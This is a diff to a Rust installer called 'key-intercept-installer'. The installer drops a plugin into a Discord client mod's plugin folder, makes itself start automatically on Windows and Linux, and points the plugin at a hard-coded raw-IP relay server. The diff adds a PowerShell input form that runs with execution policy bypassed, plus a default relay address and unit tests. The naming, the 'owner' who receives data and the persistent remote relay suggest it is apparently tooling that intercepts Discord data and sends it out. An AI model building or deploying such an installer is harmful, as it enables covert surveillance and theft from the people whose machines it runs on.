@@ -20,9 +20,9 @@ use zip::ZipArchive;
 #[command(name = "key-intercept-installer")]
 struct Args {
     #[arg(long)]
-    owner_discord_id: String,
+    owner_discord_id: Option<String>,
 
-    #[arg(long, default_value = "https://82.165.196.147:45491")]
+    #[arg(long)]
     relay_server_url: Option<String>,
 
     #[arg(long, default_value = "Key-Intercept")]
@@ -81,6 +81,10 @@ struct LocalSources {
 #[tokio::main]
 async fn main() -> Result<()> {
     let args = Args::parse();
+    let owner_discord_id =
+        resolve_owner_discord_id(args.owner_discord_id, args.relay_server_url.as_deref())?;
+    let relay_server_url =
+        resolve_relay_server_url(args.relay_server_url, owner_discord_id.relay_server_url);
     let loopback_artifact = args
         .loopback_artifact
         .as_deref()
@@ -105,7 +109,7 @@ async fn main() -> Result<()> {
             &local_sources.plugin_file,
             &args.plugin_file_name,
             &args.vencord_plugin_folder,
-            args.relay_server_url.as_deref(),
+            relay_server_url.as_deref(),
         )?;
     } else {
         let client = build_client()?;
@@ -136,14 +140,72 @@ async fn main() -> Result<()> {
             &plugin_source,
             &args.plugin_file_name,
             &args.vencord_plugin_folder,
-            args.relay_server_url.as_deref(),
+            relay_server_url.as_deref(),
         )?;
     }
 
-    configure_loopback_startup(&args.owner_discord_id, args.relay_server_url.as_deref())?;
+    configure_loopback_startup(
+        &owner_discord_id.owner_discord_id,
+        relay_server_url.as_deref(),
+    )?;
 
     println!("Installation complete.");
     Ok(())
+}
+
+#[derive(Debug)]
+struct ResolvedOwner {
+    owner_discord_id: String,
+    relay_server_url: Option<String>,
+}
+
+#[cfg(not(windows))]
+fn resolve_owner_discord_id(
+    owner_discord_id: Option<String>,
+    _relay_server_url: Option<&str>,
+) -> Result<ResolvedOwner> {
+    let owner_discord_id = owner_discord_id
+        .ok_or_else(|| anyhow!("--owner-discord-id is required on this platform"))?;
+    validate_owner_discord_id(&owner_discord_id)?;
+    Ok(ResolvedOwner {
+        owner_discord_id,
+        relay_server_url: None,
+    })
+}
+
+#[cfg(windows)]
+fn resolve_owner_discord_id(
+    owner_discord_id: Option<String>,
+    relay_server_url: Option<&str>,
+) -> Result<ResolvedOwner> {
+    if let Some(owner_discord_id) = owner_discord_id {
+        validate_owner_discord_id(&owner_discord_id)?;
+        return Ok(ResolvedOwner {
+            owner_discord_id,
+            relay_server_url: None,
+        });
+    }
+    collect_windows_wizard_inputs(relay_server_url)
+}
+
+fn resolve_relay_server_url(
+    cli_relay_server_url: Option<String>,
+    wizard_relay_server_url: Option<String>,
+) -> Option<String> {
+    cli_relay_server_url
+        .or(wizard_relay_server_url)
+        .or_else(|| Some(default_relay_server_url().to_string()))
+}
+
+fn validate_owner_discord_id(owner_discord_id: &str) -> Result<()> {
+    if owner_discord_id.is_empty() || !owner_discord_id.chars().all(|ch| ch.is_ascii_digit()) {
+        bail!("owner Discord ID must contain only digits");
+    }
+    Ok(())
+}
+
+fn default_relay_server_url() -> &'static str {
+    "https://82.165.196.147:45491"
 }
 
 fn build_client() -> Result<reqwest::Client> {
@@ -690,6 +752,113 @@ fn windows_startup_dir() -> Result<PathBuf> {
         .join("Startup"))
 }
 
+#[cfg(windows)]
+fn collect_windows_wizard_inputs(relay_server_url: Option<&str>) -> Result<ResolvedOwner> {
+    let default_relay_server_url = relay_server_url.unwrap_or(default_relay_server_url());
+    let script = r#"
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+$form = New-Object System.Windows.Forms.Form
+$form.Text = "Key Intercept Installer"
+$form.StartPosition = "CenterScreen"
+$form.Width = 480
+$form.Height = 220
+$form.FormBorderStyle = "FixedDialog"
+$form.MaximizeBox = $false
+$form.MinimizeBox = $false
+
+$ownerLabel = New-Object System.Windows.Forms.Label
+$ownerLabel.Left = 12
+$ownerLabel.Top = 20
+$ownerLabel.Width = 440
+$ownerLabel.Text = "Owner Discord ID"
+$form.Controls.Add($ownerLabel)
+
+$ownerInput = New-Object System.Windows.Forms.TextBox
+$ownerInput.Left = 12
+$ownerInput.Top = 42
+$ownerInput.Width = 440
+$form.Controls.Add($ownerInput)
+
+$relayLabel = New-Object System.Windows.Forms.Label
+$relayLabel.Left = 12
+$relayLabel.Top = 76
+$relayLabel.Width = 440
+$relayLabel.Text = "Relay server URL"
+$form.Controls.Add($relayLabel)
+
+$relayInput = New-Object System.Windows.Forms.TextBox
+$relayInput.Left = 12
+$relayInput.Top = 98
+$relayInput.Width = 440
+$relayInput.Text = $env:KEY_INTERCEPT_DEFAULT_RELAY_URL
+$form.Controls.Add($relayInput)
+
+$okButton = New-Object System.Windows.Forms.Button
+$okButton.Text = "Install"
+$okButton.Left = 276
+$okButton.Top = 132
+$okButton.Width = 84
+$okButton.DialogResult = [System.Windows.Forms.DialogResult]::OK
+$form.Controls.Add($okButton)
+
+$cancelButton = New-Object System.Windows.Forms.Button
+$cancelButton.Text = "Cancel"
+$cancelButton.Left = 368
+$cancelButton.Top = 132
+$cancelButton.Width = 84
+$cancelButton.DialogResult = [System.Windows.Forms.DialogResult]::Cancel
+$form.Controls.Add($cancelButton)
+
+$form.AcceptButton = $okButton
+$form.CancelButton = $cancelButton
+
+if ($form.ShowDialog() -ne [System.Windows.Forms.DialogResult]::OK) {
+    exit 2
+}
+
+$owner = $ownerInput.Text.Trim()
+$relay = $relayInput.Text.Trim()
+Write-Output $owner
+Write-Output $relay
+"#;
+
+    let output = Command::new("powershell")
+        .arg("-NoProfile")
+        .arg("-ExecutionPolicy")
+        .arg("Bypass")
+        .arg("-Command")
+        .arg(script)
+        .env(
+            "KEY_INTERCEPT_DEFAULT_RELAY_URL",
+            default_relay_server_url.to_string(),
+        )
+        .output()
+        .context("failed to launch Windows installer wizard")?;
+
+    if !output.status.success() {
+        bail!("Windows installer wizard was cancelled");
+    }
+
+    let mut lines = String::from_utf8(output.stdout)
+        .context("failed to parse Windows installer wizard output")?
+        .lines()
+        .map(str::trim)
+        .filter(|line| !line.is_empty());
+    let owner_discord_id = lines
+        .next()
+        .ok_or_else(|| anyhow!("Windows installer wizard did not return owner Discord ID"))?
+        .to_string();
+    validate_owner_discord_id(&owner_discord_id)?;
+
+    let relay_server_url = lines.next().map(|value| value.to_string());
+
+    Ok(ResolvedOwner {
+        owner_discord_id,
+        relay_server_url,
+    })
+}
+
 fn run_systemctl<const N: usize>(args: [&str; N]) -> Result<()> {
     let status = Command::new("systemctl")
         .args(args)
@@ -870,6 +1039,35 @@ mod tests {
     fn relay_origin_for_csp_preserves_scheme_host_and_port() {
         let origin = relay_origin_for_csp("http://82.165.196.147:45491").unwrap();
         assert_eq!(origin, "http://82.165.196.147:45491");
+    }
+
+    #[test]
+    fn resolve_relay_server_url_prefers_cli_over_wizard_and_default() {
+        let relay = resolve_relay_server_url(
+            Some("https://cli.example".to_string()),
+            Some("https://wizard.example".to_string()),
+        );
+        assert_eq!(relay.as_deref(), Some("https://cli.example"));
+    }
+
+    #[test]
+    fn resolve_relay_server_url_uses_default_when_missing() {
+        let relay = resolve_relay_server_url(None, None);
+        assert_eq!(relay.as_deref(), Some(default_relay_server_url()));
+    }
+
+    #[test]
+    fn validate_owner_discord_id_requires_digits() {
+        assert!(validate_owner_discord_id("1234567890").is_ok());
+        assert!(validate_owner_discord_id("12abc").is_err());
+    }
+
+    #[cfg(not(windows))]
+    #[test]
+    fn non_windows_owner_discord_id_is_required() {
+        assert!(resolve_owner_discord_id(None, None).is_err());
+        let resolved = resolve_owner_discord_id(Some("123456".to_string()), None).unwrap();
+        assert_eq!(resolved.owner_discord_id, "123456");
     }
 
     #[test]
